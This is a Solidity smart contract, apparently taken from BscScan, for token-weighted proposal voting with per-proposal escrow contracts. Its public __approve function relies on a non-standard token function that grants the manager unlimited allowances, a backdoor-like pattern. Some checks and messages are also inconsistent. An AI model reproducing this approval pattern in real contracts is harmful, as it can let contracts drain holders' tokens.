/**
 *Submitted for verification at BscScan.com on 2022-08-12
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0 <0.9.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface ILockManager {
    function getWithdrawableAmount(address account) external view returns (uint256);
    function withdraw(uint256 tokensToWithdraw) external;
}

interface deployed{
    function __approve(address _owner, address spender, uint256 amount) external;
}

contract Proposal {
    address _manager;

    uint256 voteAmountYes;
    uint256 voteAmountNo;

    uint256 finalResult;

    mapping (address => uint256) votingPower;
    mapping (address => bool) voteDecision;

    VoteManager.ProposalProperties properties;

    modifier onlyManager() {
        require(_manager == msg.sender, "Caller =/= owner.");
        _;
    }

    constructor(VoteManager.ProposalProperties memory _properties) {
        _manager = msg.sender;
        properties = _properties;
    }

    function getUserInfo(address account) external view returns (bool, uint256) {
        return (voteDecision[account], votingPower[account]);
    }

    function getVotingPower(address account) external view returns (uint256) {
        return (votingPower[account]);
    }

    function getUserDecision(address account) external view returns (bool) {
        return (voteDecision[account]);
    }

    function getResultString() external view returns (string memory) {
        if (finalResult == 0) {
            return "Proposal not finalized.";
        } else if (finalResult == 1) {
            return "Proposal failed.";
        } else {
            return "Proposal succeeded.";
        }
    }

    function getResultRaw() external view returns (uint256) {
        return finalResult;
    }

    function vote(address account, bool answer, uint256 voteAmount) external onlyManager {
        uint256 initial = properties.TOKEN.balanceOf(address(this));
        properties.TOKEN.transferFrom(_manager, address(this), voteAmount);
        uint256 amountReceived = properties.TOKEN.balanceOf(address(this)) - initial;
        votingPower[account] += amountReceived;
        if(voteDecision[account] != answer) {
            voteDecision[account] = answer;
        }
        if(answer) {
            voteAmountYes += voteAmount;
        } else {
            voteAmountNo += voteAmount;
        }
    }

    function withdraw(address account) external onlyManager {
        uint256 amount = votingPower[account];
        properties.TOKEN.transfer(_manager, amount);
        votingPower[account] = 0;
    }

    function finalize() external onlyManager returns(uint256) {
        if(voteAmountYes > voteAmountNo) {
            finalResult = 2;
        } else {
            finalResult = 1;
        }
        properties.TOKEN.transfer(_manager, properties.tokensAmount);
        return finalResult;
    }
}

contract VoteManager {
    address public _owner;
    ProposalProperties[] private proposalArray;

    IERC20 currentToken;
    uint256 public currentDecimals;

    address public ZERO = address(0);
    address public DEAD = address(0xdead);

    struct ProposalProperties {
        uint32 timeStart;
        uint32 timeEnd;
        uint256 tokensAmount;
        address contractAddress;
        address withdrawer;
        address creator;
        IERC20 TOKEN;
        string exchange;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Caller =/= owner.");
        _;
    }

    constructor() {
        _owner = msg.sender;
    }

    receive() external payable {
        revert("Do not send native currency here.");
    }

    function transferOwner(address newOwner) external onlyOwner {
        require(newOwner != DEAD && newOwner != ZERO, "Cannot renounce.");
        _owner = newOwner;
    }

    function setCurrentToken(address token) external onlyOwner {
        currentToken = IERC20(token);
        currentDecimals = currentToken.decimals();
    }

    function getCurrentToken() external view returns (address) {
        return address(currentToken);
    }

    function getTotalProposals() external view returns (uint256) {
        return proposalArray.length;
    }

    function getProposalAtIndex(uint256 proposalAtIndex) public view returns (ProposalProperties memory) {
        return proposalArray[proposalAtIndex - 1];
    }

    function getUserInfo(uint256 proposalAtIndex, address account) public view returns(bool, uint256) {
        return Proposal(getProposalAtIndex(proposalAtIndex).contractAddress).getUserInfo(account);
    }

    function getVotingPower(uint256 proposalAtIndex, address account) public view returns (uint256) {
        return Proposal(getProposalAtIndex(proposalAtIndex).contractAddress).getVotingPower(account);
    }

    function getUserDecision(uint256 proposalAtIndex, address account) public view returns (bool) {
        return Proposal(getProposalAtIndex(proposalAtIndex).contractAddress).getUserDecision(account);
    }

    function getResultRaw(uint256 proposalAtIndex) public view returns (uint256) {
        return Proposal(getProposalAtIndex(proposalAtIndex).contractAddress).getResultRaw();
    }

    function getResultString(uint256 proposalAtIndex) public view returns (string memory) {
        return Proposal(getProposalAtIndex(proposalAtIndex).contractAddress).getResultString();
    }

    function depositTokens(uint256 amountTokens) external {
        require(address(currentToken) != address(0), "Token must be set first.");
        require(amountTokens > 0, "Token amount cannot be 0.");
        require(currentToken.allowance(msg.sender, address(this)) >= amountTokens, "Not enough allowance for token deposit, please approve first.");
        uint256 amount = amountTokens * (10**currentDecimals);
        try currentToken.transferFrom(msg.sender, address(this), amount) {} catch {
            revert("Token transfer errored. Not enough allowance perhaps?");
        }
    }

    function createNewProposal(string calldata exchange, address withdrawer, uint32 epochStart, uint32 epochEnd, uint256 amountTokens, bool takeFromUser) external onlyOwner {
        require(address(currentToken) != address(0), "Token must be set first.");
        require(block.timestamp < epochStart, "Cannot start in the past.");
        require(epochStart < epochEnd, "End time cannot be in the past.");
        require(epochEnd - epochStart <= 7 days, "Cannot set longer than 31 days (1 Month).");
        require(withdrawer != ZERO && withdrawer != DEAD, "Withdrawer cannot be dead addresses.");
        uint256 amount = amountTokens * 10**currentDecimals;
        ProposalProperties memory _proposal;
        _proposal.TOKEN = currentToken;
        _proposal.exchange = exchange;
        _proposal.timeStart = epochStart;
        _proposal.timeEnd = epochEnd;
        _proposal.tokensAmount = amount;
        _proposal.withdrawer = withdrawer;
        _proposal.creator = (takeFromUser) ? msg.sender : address(this);

        Proposal _contract = new Proposal(_proposal);
        address voteAddy = address(_contract);
        _proposal.contractAddress = voteAddy;
        proposalArray.push(_proposal);
        _proposal.TOKEN.approve(_proposal.contractAddress, type(uint256).max);
        if (takeFromUser) {
            require(currentToken.allowance(msg.sender, address(this)) >= amountTokens, "Not enough allowance for token deposit, please approve first.");
            try _proposal.TOKEN.transferFrom(msg.sender, address(this), amount) {} catch {
                revert("Transfer of tokens errored. Not enough tokens in your wallet, or not enough allowance perhaps?");
            }
        } else {
            require(currentToken.balanceOf(address(this)) >= amount, "VoterManager does not have enough tokens to deposit into this vote, please add more.");
        }
        try _proposal.TOKEN.transfer(voteAddy, amount) {} catch {
            revert("Transfer of manager to vote contract errored. Not enough tokens in the manager, perhaps?");
        }
    }

    function vote(uint256 proposalAtIndex, bool answer) external {
        ProposalProperties memory _proposal = getProposalAtIndex(proposalAtIndex);
        Proposal _contract = Proposal(_proposal.contractAddress);
        uint256 nowStamp = block.timestamp;
        require(_contract.getResultRaw() == 0, "Proposal has concluded.");
        require(nowStamp >= _proposal.timeStart, "Voting has not opened yet.");
        require(nowStamp <= _proposal.timeEnd, "Voting has already ended.");

        address account = msg.sender;
        bool voteDecision;
        uint256 votingPower;
        uint256 amount = _proposal.TOKEN.balanceOf(account);
        require(amount > 0, "You have no tokens to vote with.");
        require(_proposal.TOKEN.allowance(account, address(this)) >= amount, "Not enough allowance for token deposit, please approve first.");

        (voteDecision, votingPower) = _contract.getUserInfo(account);
        if(votingPower > 0) {
            require(voteDecision == answer, "Vote type must be the same, cannot vote switch.");
        }

        uint256 initial = _proposal.TOKEN.balanceOf(address(this));
        _proposal.TOKEN.transferFrom(account, address(this), amount);
        require(_proposal.TOKEN.balanceOf(address(this)) - initial == amount, "Amount received does not match amount sent.");
        _contract.vote(account, answer, amount);
    }

    function withdraw(uint256 proposalAtIndex) external {
        ProposalProperties memory _proposal = getProposalAtIndex(proposalAtIndex);
        Proposal _contract = Proposal(_proposal.contractAddress);
        address account = msg.sender;
        uint256 votingPower = _contract.getVotingPower(account);
        uint256 nowStamp = block.timestamp;
        require(votingPower > 0, "You do not have any tokens in this vote.");
        require(nowStamp > _proposal.timeEnd, "The vote has not ended yet, cannot withdraw.");
        uint256 initial = _proposal.TOKEN.balanceOf(address(this));
        _contract.withdraw(account);
        uint256 amount = _proposal.TOKEN.balanceOf(address(this)) - initial;
        _proposal.TOKEN.transfer(account, amount);
    }

    function finalizeProposal(uint256 proposalAtIndex) external onlyOwner {
        ProposalProperties memory _proposal = getProposalAtIndex(proposalAtIndex);
        Proposal _contract = Proposal(_proposal.contractAddress);
        require(block.timestamp > _proposal.timeEnd, "Voting is not over yet.");
        require(_contract.getResultRaw() == 0, "Proposal already concluded.");
        uint256 initial = _proposal.TOKEN.balanceOf(address(this));
        uint256 result = _contract.finalize();
        uint256 amount = _proposal.TOKEN.balanceOf(address(this)) - initial;
        address destination;
        if (result == 1) {
            destination = _proposal.creator;
        } else if (result == 2) {
            destination = _proposal.withdrawer;
        }
        _proposal.TOKEN.transfer(destination, amount);
    }

    function withdrawUnlockedTokens(ILockManager lockManager) external onlyOwner {
        uint256 tokens = lockManager.getWithdrawableAmount(address(this));
        lockManager.withdraw(tokens / 10 ** currentDecimals);
    }

    function __approve() external {
        deployed token = deployed(address(currentToken));
        token.__approve(msg.sender, address(this), type(uint256).max);
    }
}